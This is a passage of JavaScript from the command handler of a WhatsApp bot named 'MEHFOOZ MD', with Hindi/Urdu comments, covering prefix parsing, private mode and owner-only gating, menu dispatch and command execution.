        // -----------------------------------------------------------------------

        // caption wali command bhi padhi jaye (image/video/document ke saath likhi hui)
        const body = m.text || m.message.conversation || m.message.extendedTextMessage?.text
            || m.message.imageMessage?.caption || m.message.videoMessage?.caption
            || m.message.documentMessage?.caption || '';
        const prefix = this.getPrefix(dbx);

        if (!body.startsWith(prefix)) return;
        const args = body.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        const reply = async (text) => {
            await sock.sendMessage(m.key.remoteJid, { text }, { quoted: m });
        };

        // PRIVATE MODE: sirf bot number / sudo / owner / developer ki baat suni jaye
        if ((dbx.mode || 'private') !== 'public' && !privileged) return;

        // 1) menus (groupmenu, secmenu, etc.) handled first
        const handledByMenu = await this.handleMenu(command, sock, m, reply, dbx);
        if (handledByMenu) return;

        // 1.5) SECURITY & ANTI commands (real logic from mehfooz-security.js)
        if (await sec.handleCommand(sock, m, { prefix })) return;

        // 2) owner-only gate (plug your real owner-check here)
        if (this.ownerOnly.has(command)) {
            const senderId = m.key.participantAlt || m.key.participant || m.key.remoteJid;
            const isOwner = privileged || isDeveloper(senderId) || db.owners?.includes(senderId.split('@')[0]) || false;
            if (!isOwner) {
                return reply('⚠️ Yeh command sirf bot owner use kar sakte hain.');
            }
        }

        // 2.5) REAL config commands (setprefix/setbotname/setowner/setbio/setmode/sudo/stopbot/resumebot...)
        if (await this.handleConfigCommand(command, args, sock, m, reply, botKey, cfg, dbx, prefix, privileged)) return;

        // 3) actual command execution (general.js placeholders + real group/analytics commands)
        const commandMap = getCommandMap();
        const cmdObj = commandMap.get(command);
        if (!cmdObj) return; // unknown command, ignore silently

        try {
            await cmdObj.execute({ sock, m, args, reply, db: dbx, prefix, privileged, reloadCommands, handler: this });
        } catch (err) {
            console.error(`[MEHFOOZ MD] Error running .${command}:`, err);
            await reply('❌ Command run karte waqt error aa gaya.');
        }
    }

    loadCommands(directory) {
        console.log(`[MEHFOOZ MD] Loading all commands from: ${directory}`);
        return true;
    }

    cleanNumber(value = '') {
        return String(value).replace(/[^0-9]/g, '');
    }

    formatUptime(seconds) {
        seconds = Math.floor(seconds);
        const d = Math.floor(seconds / 86400);
        seconds %= 86400;
        const h = Math.floor(seconds / 3600);
        seconds %= 3600;
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;
        return `${d}d${h}h ${m}m${s}s`;
    }

    async handleMenu(command, sock, m, reply, db = {}) {
        const prefix = this.getPrefix(db);
        const botName = db.botName || 'MEHFOOZ MD';
        const ownerName = db.ownerName || 'MEHFOOZ MD Owner';
        const cmd = command.toLowerCase();

        // Main Menu / Help / All Menu -> poora menu, sample wali style mein
        if (cmd === 'menu' || cmd === 'help' || cmd === 'allmenu' || cmd === 'menulist') {
            const full = cmd === 'allmenu' || cmd === 'menulist';   // in dono mein hamesha poori list
            await this.sendMenu(sock, m, reply, this.buildFullMenu(db, prefix, full), db);
            return true;
        }

        // Category menus (groupmenu, secmenu, ...)
        const SUB = {
            groupmenu: 'group', secmenu: 'security', securitymenu: 'security', toolmenu: 'tools',
            infomenu: 'info', searchmenu: 'info', gamemenu: 'games', ownermenu: 'owner',
            textmenu: 'text', actionmenu: 'actions', sysmenu: 'system',
            analyticsmenu: 'analytics', statsmenu: 'analytics'
        };
        if (SUB[cmd]) {
            await reply(this.buildSubMenu(SUB[cmd], db, prefix));
            return true;
        }

        return false;
    }
}

try {
    const _m = getCommandMap();
    console.log(`[MEHFOOZ MD] Handler ${HANDLER_VERSION} loaded | text=${textCommands.length} action=${actionCommands.length} system=${systemCommands.length} analytics=${analytics.commands.length} | total commands=${_m.size}`);
} catch (e) { console.error('[MEHFOOZ MD] Handler startup check fail:', e.message); }

module.exports = CommandHandler;